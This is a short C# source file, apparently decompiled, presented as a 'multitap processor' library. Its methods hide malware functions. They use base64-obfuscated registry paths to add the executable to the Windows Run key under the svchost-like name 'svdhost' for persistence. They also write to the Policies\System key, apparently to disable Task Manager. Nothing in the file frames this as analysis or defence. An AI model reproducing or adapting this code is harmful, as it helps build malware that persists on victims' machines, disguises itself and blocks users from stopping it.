using System;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MULTITAPPROCESSORLIB;

internal class multitapADD
{
	private const string name = "svdhost";

	private string processname = "TaskMgr";

	public bool TAPVerifier(int grade)
	{
		if (grade < DateTime.Now.Year && grade > DateTime.Now.Second)
		{
			return true;
		}
		return false;
	}

	public string base64Decode(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			throw new Exception("Error in base64Decode" + ex.Message);
		}
	}

	public bool SETTAPDELAYVALUE(bool autorun)
	{
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(base64Decode("U29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1blxc"));
		try
		{
			if (autorun)
			{
				registryKey.SetValue("svdhost", executablePath);
			}
			else
			{
				registryKey.DeleteValue("svdhost");
			}
			registryKey.Close();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public bool checkSpotOS(string osmane)
	{
		if (osmane == "win")
		{
			return true;
		}
		return false;
	}

	public void setmagicrun(string spotrunnerpath, string paternname)
	{
		try
		{
			if (checkSpotOS("win"))
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(spotrunnerpath + base64Decode("bmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxQb2xpY2llc1xcU3lzdGVt"));
				registryKey.SetValue(paternname + processname, 1);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}
}
